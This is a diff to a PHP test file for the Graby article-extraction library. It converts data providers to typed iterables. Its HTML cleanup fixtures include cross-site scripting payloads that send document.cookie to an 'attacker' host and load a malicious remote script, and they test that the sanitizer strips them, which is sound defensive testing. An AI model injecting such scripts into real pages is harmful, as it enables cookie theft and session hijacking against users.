@@ -22,11 +22,11 @@ class GrabyTest extends TestCase
 
     /**
      * Parsing method inspired from Twig_Test_IntegrationTestCase.
+     *
+     * @return iterable<array{url: string, urlEffective: string, header: string, language: string, author: string, title: string, summary: string, rawContent: string, rawContent2: string, parsedContent: string}>
      */
-    public function dataForFetchContent(): array
+    public function dataForFetchContent(): iterable
     {
-        $tests = [];
-
         $fileFixtureIterator = new \RecursiveIteratorIterator(
             new \RecursiveDirectoryIterator(__DIR__ . '/fixtures/sites/'),
             \RecursiveIteratorIterator::LEAVES_ONLY
@@ -41,21 +41,19 @@ class GrabyTest extends TestCase
             $parses = preg_match('/-----URL-----\s*(?P<url>.*?)\s*-----URL_EFFECTIVE-----\s*(?P<url_effective>.*?)\s*-----HEADER-----\s*(?P<header>.*?)\s*-----LANGUAGE-----\s*(?P<language>.*?)\s*-----AUTHOR-----\s*(?P<author>.*?)\s*-----TITLE-----\s*(?P<title>.*?)\s*-----SUMMARY-----\s*(?P<summary>.*?)\s*-----RAW_CONTENT-----\s*(?P<raw_content>.*?)\s*(?:------RAW_CONTENT2-----\s*(?P<raw_content2>.*?)\s*)?----PARSED_CONTENT-----\s*(?P<parsed_content>.*)\s*/sx', $test, $match);
             \assert(1 === $parses, \sprintf('File %s does not match the required pattern', $file->getRealpath()));
 
-            $tests[] = [
-                $match['url'],
-                $match['url_effective'],
-                $match['header'],
-                $match['language'],
-                $match['author'],
-                $match['title'],
-                $match['summary'],
-                $match['raw_content'],
-                $match['raw_content2'],
-                $match['parsed_content'],
+            yield [
+                'url' => $match['url'],
+                'urlEffective' => $match['url_effective'],
+                'header' => $match['header'],
+                'language' => $match['language'],
+                'author' => $match['author'],
+                'title' => $match['title'],
+                'summary' => $match['summary'],
+                'rawContent' => $match['raw_content'],
+                'rawContent2' => $match['raw_content2'],
+                'parsedContent' => $match['parsed_content'],
             ];
         }
-
-        return $tests;
     }
 
     /**
@@ -102,7 +100,10 @@ class GrabyTest extends TestCase
         $this->assertFalse($res->getIsNativeAd());
     }
 
-    public function dataForAllowed(): array
+    /**
+     * @return iterable<array{string, string}>
+     */
+    public function dataForAllowed(): iterable
     {
         return [
             ['feed://wikipedia.org', 'http://wikipedia.org'],
@@ -128,7 +129,10 @@ class GrabyTest extends TestCase
         $this->assertSame((string) $res->getEffectiveResponse()->getEffectiveUri(), $urlChanged);
     }
 
-    public function dataForBlocked(): array
+    /**
+     * @return iterable<array{string}>
+     */
+    public function dataForBlocked(): iterable
     {
         return [
             ['feed://lexpress.fr'],
@@ -151,7 +155,10 @@ class GrabyTest extends TestCase
         $graby->fetchContent($url);
     }
 
-    public function dataForNotValid(): array
+    /**
+     * @return iterable<array{string}>
+     */
+    public function dataForNotValid(): iterable
     {
         return [
             ['http://lexpress devant.fr'],
@@ -233,7 +240,10 @@ class GrabyTest extends TestCase
         $this->assertSame('GET', $httpMockClient->getRequests()[1]->getMethod());
     }
 
-    public function dataForExtension(): array
+    /**
+     * @return iterable<array{string, string, string, string, string}>
+     */
+    public function dataForExtension(): iterable
     {
         return [
             ['http://example.com/test.jpg', 'image/jpeg', 'Image', '', '<a href="http://example.com/test.jpg"><img src="http://example.com/test.jpg" alt="Image" /></a>'],
@@ -364,7 +374,10 @@ class GrabyTest extends TestCase
         $this->assertFalse($res->getIsNativeAd());
     }
 
-    public function dataForSinglePage(): array
+    /**
+     * @return iterable<array{string, string, string}>
+     */
+    public function dataForSinglePage(): iterable
     {
         return [
             'single_page_link will return a string (ie the text content of <a> node)' => ['singlepage1.com', 'http://singlepage1.com/printed%20view', 'http://moreintelligentlife.com/print/content'],
@@ -674,7 +687,10 @@ class GrabyTest extends TestCase
         $this->assertFalse($res->getIsNativeAd());
     }
 
-    public function dataForExcerpt(): array
+    /**
+     * @return iterable<array{string, int, ?string, string}>
+     */
+    public function dataForExcerpt(): iterable
     {
         return [
             ['hello you are fine', 35, null, 'hello you are fine'],
@@ -705,7 +721,10 @@ class GrabyTest extends TestCase
         $this->assertSame($expectedResult, $res);
     }
 
-    public function dataForMakeAbsoluteStr(): array
+    /**
+     * @return iterable<array{string, string, ?string}>
+     */
+    public function dataForMakeAbsoluteStr(): iterable
     {
         return [
             ['example.org', '/test', null],
@@ -736,7 +755,10 @@ class GrabyTest extends TestCase
         $this->assertSame($expectedResult, null === $res ? $res : (string) $res);
     }
 
-    public function dataForMakeAbsoluteAttr(): array
+    /**
+     * @return iterable<array{string, string, string, string, string}>
+     */
+    public function dataForMakeAbsoluteAttr(): iterable
     {
         return [
             ['http://example.org', '<a href="/lol">test</a>', 'href', 'href', 'http://example.org/lol'],
@@ -771,7 +793,10 @@ class GrabyTest extends TestCase
         $this->assertSame($expectedResult, $e->getAttribute($expectedAttr));
     }
 
-    public function dataForMakeAbsolute(): array
+    /**
+     * @return iterable<array{string, string, string, string}>
+     */
+    public function dataForMakeAbsolute(): iterable
     {
         return [
             ['http://example.org', '<a href="/lol">test</a>', 'href', 'http://example.org/lol'],
@@ -853,7 +878,10 @@ class GrabyTest extends TestCase
         $this->assertFalse($res->getIsNativeAd());
     }
 
-    public function dataForSafeCurl(): array
+    /**
+     * @return iterable<array{string}>
+     */
+    public function dataForSafeCurl(): iterable
     {
         return [
             ['http://0.0.0.0:123'],
@@ -907,7 +935,10 @@ class GrabyTest extends TestCase
         $this->assertFalse($res->getIsNativeAd());
     }
 
-    public function dataWithAccent(): array
+    /**
+     * @return iterable<array{string, string}>
+     */
+    public function dataWithAccent(): iterable
     {
         return [
             'host with accent' => ['http://pérotin.com/post/2009/06/09/SAV-Free-un-sketch-kafkaien', 'http://xn--protin-bva.com/post/2009/06/09/SAV-Free-un-sketch-kafkaien'],
@@ -933,7 +964,10 @@ class GrabyTest extends TestCase
         $this->assertSame($urlExpected, (string) $res);
     }
 
-    public function dataForCleanupHtml(): array
+    /**
+     * @return iterable<array{string, string, bool}>
+     */
+    public function dataForCleanupHtml(): iterable
     {
         return [
             'nothing' => [
@@ -959,10 +993,12 @@ class GrabyTest extends TestCase
             'script_location_removed_from_long_text' => [
                 '<html><body><div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p><script>window.location="http://attacker/?cookie="+document.cookie</script><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div></body></html>',
                 '<div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div>',
+                false,
             ],
             'script_inject_removed_from_long_text' => [
                 '<html><script src="http://attacker/malicious‑script.js"></script><body><div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div></body></html>',
                 '<div><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p></div>',
+                false,
             ],
         ];
     }
@@ -970,7 +1006,7 @@ class GrabyTest extends TestCase
     /**
      * @dataProvider dataForCleanupHtml
      */
-    public function testCleanupHtml(string $html, string $expected, bool $withLog = false): void
+    public function testCleanupHtml(string $html, string $expected, bool $withLog): void
     {
         $logger = new Logger('foo');
         $handler = new TestHandler();
@@ -1068,7 +1104,10 @@ class GrabyTest extends TestCase
         $this->assertEmpty($res->getImage());
     }
 
-    public function dataDate(): array
+    /**
+     * @return iterable<array{string, string, string}>
+     */
+    public function dataDate(): iterable
     {
         return [
             [
@@ -1096,7 +1135,10 @@ class GrabyTest extends TestCase
         $this->assertSame($expectedDate, $res->getDate());
     }
 
-    public function dataAuthors(): array
+    /**
+     * @return iterable<array{string, string, string[]}>
+     */
+    public function dataAuthors(): iterable
     {
         return [
             [
@@ -1114,6 +1156,8 @@ class GrabyTest extends TestCase
 
     /**
      * @dataProvider dataAuthors
+     *
+     * @param string[] $expectedAuthors
      */
     public function testAuthors(string $url, string $file, array $expectedAuthors): void
     {
